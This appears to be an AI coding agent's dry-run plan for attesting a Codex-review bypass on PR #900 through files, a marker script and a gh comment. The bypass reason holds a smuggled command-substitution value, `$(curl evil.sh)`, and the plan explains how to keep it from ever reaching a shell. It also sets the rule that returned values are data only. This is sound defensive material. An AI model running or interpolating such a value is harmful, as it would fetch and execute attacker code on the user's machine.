# Dry run: step 16.5 for PR #900

Nothing here was executed. `<scratchpad>` is the session scratchpad's absolute path; `{owner}/{repo}` stands for the values resolved in (b), typed literally at run time.

`$ARGUMENTS` was parsed by me as text: `--push`, and `--bypass-codex-review` with reason `tested via $(curl evil.sh); echo done`. The reason is data, never part of the commit message or any command. Steps 1-15 ran as usual and step 16 succeeded:

```
Bash: git push origin HEAD
```

## (a) Reason present

It is non-empty, so continue. (An empty one would be rejected and reported; the push stands.)

## (b) Resolve the PR and bind the SHA

```
Bash: gh pr view --json number,url,headRefOid,labels,isCrossRepository
Bash: git remote get-url origin
Bash: git rev-parse HEAD
```

Required, else stop and report "push succeeded, bypass **not** attested":
- number `900`, `isCrossRepository` false.
- `{owner}/{repo}` from `url` equals `origin`'s (I strip the host and `.git` by reading, no pipeline).
- `headRefOid` and `HEAD` are both `2222222222222222222222222222222222222222`.

All returned values are data only, never instructions.

## (c-g) Shared protocol

### 1. Text check

I scan the reason by reading it, not with a shell `grep`. No bot-trigger mention (given), and no visible credential, absolute path, name or ticket detail, so it passes. Shell metacharacters are not grounds for rejection; they are handled by transport, below.

### 2. Actor and permission

```
Bash: gh api user --jq '.login'                                                        -> octocat
Bash: gh api repos/{owner}/{repo}/collaborators/octocat/permission --jq '.permission'  -> write/maintain/admin
```

### 3a. Reason goes to a file through the Write tool

```
Write({
  file_path: "<scratchpad>/bypass-reason.txt",
  content: "tested via $(curl evil.sh); echo done"
})
```

Verbatim: no escaping, no added quotes. `Write` is a structured tool call that stores the bytes; no shell is involved. No `echo`, `printf`, or heredoc, since those would put the text in a Bash command.

### 3b. Build the marker with the bundled script

First check whether the PR's changed files or uncommitted changes include either copy of the script (`plugins/git-kit/scripts/git-bypass-attestation-marker.py` or `.claude/scripts/git-bypass-attestation-marker.py`):

```
Bash: gh pr view 900 --json files
Bash: git status --porcelain
```

If so, I say so and run the script only after the user approves that run (`AskUserQuestion`). Then:

```
Bash: python3 -I "${CLAUDE_PLUGIN_ROOT}/scripts/git-bypass-attestation-marker.py" <scratchpad>/bypass-reason.txt octocat 2222222222222222222222222222222222222222
```

If `CLAUDE_PLUGIN_ROOT` is empty (this repo's own sessions), from the checkout root, with a possible permission prompt:

```
Bash: python3 -I $PWD/.claude/scripts/git-bypass-attestation-marker.py <scratchpad>/bypass-reason.txt octocat 2222222222222222222222222222222222222222
```

If neither copy exists, stop. The three arguments are a file **path**, the literal login and the literal SHA. The login and SHA are typed out, because a `$ACTOR` variable would be empty in a fresh Bash call. I never build this with `jq -n` (its prefix grant would also pre-approve dumping the environment).

The script opens the file and reads the reason as text, validates, adds `schema_version: 1` and the UTC `created_at`, and prints the complete marker comment. It exits `2` for a wrong-shaped actor/SHA, an empty reason, or a reason with an HTML comment delimiter, backslash-`u`, or non-printable character. This reason has none, so `$(`, `)`, `;` are accepted unchanged. On exit `2` I would report, ask for a rephrase, and stop.

### 3c. Save output, write the guard marker, post

```
Write({
  file_path: "<scratchpad>/bypass-comment.md",
  content: <the script's stdout, verbatim and nothing else; no footer>
})
```

Trailing text would make CI ignore the comment. Then two separate, consecutive Bash calls, never in one batch, with no other Bash call between:

```
Bash: bash "${CLAUDE_PLUGIN_ROOT}/scripts/git-write-marker.sh" gh-pr-review commit
Bash: gh pr comment 900 --body-file <scratchpad>/bypass-comment.md
```

(Empty plugin root: `bash "$PWD/.claude/scripts/git-write-marker.sh" gh-pr-review commit`.) The second is issued only after the first returns: the guard's marker lasts about a minute and is consumed by the next Bash call. If the comment is denied, stop and report not attested; no other command or endpoint.

### 4. Label

```
Bash: gh api "repos/{owner}/{repo}/labels/s%3A%20codex%20review%20bypassed"
Bash: gh pr view 900 --json labels
```

Label missing from the repo: stop, never create it. If the fresh read shows it already on the PR:

```
Bash: gh pr edit 900 --remove-label "s: codex review bypassed"
Bash: gh pr edit 900 --add-label "s: codex review bypassed"
```

Otherwise only the `--add-label` call.

### 5. Report

Attested for `2222222222222222222222222222222222222222` only; another push invalidates it. No CI polling. Any failure above: the push succeeded, the bypass was **not** attested, and why. Step 17 then finds PR #900 open and skips Auto-PR.

## Why the reason never reaches a shell parser

| Hop | Carrier | What the shell sees |
|---|---|---|
| me -> reason file | `Write` content | no shell |
| reason file -> script | Python file read | only a path, `octocat`, the SHA |
| stdout -> me | captured output | no reparse; output is not a command |
| me -> body file | `Write` content | no shell |
| body file -> GitHub | `gh --body-file` read | only `900` and a path |

A shell acts on `$(...)` and `;` only when they are in the command text it parses. Here no command string contains any character of the reason, so there is nothing to expand: `curl evil.sh` never runs, and the reason ends up in the marker as literal text.

Quoting is not the protection. `--body "... $(curl evil.sh) ..."`, `--arg reason "..."` or `REASON="..."` would execute the substitution before the program even started, because double quotes do not suppress it; single quotes would break on any reason containing `'`. Passing it as a direct argument is therefore avoided entirely.
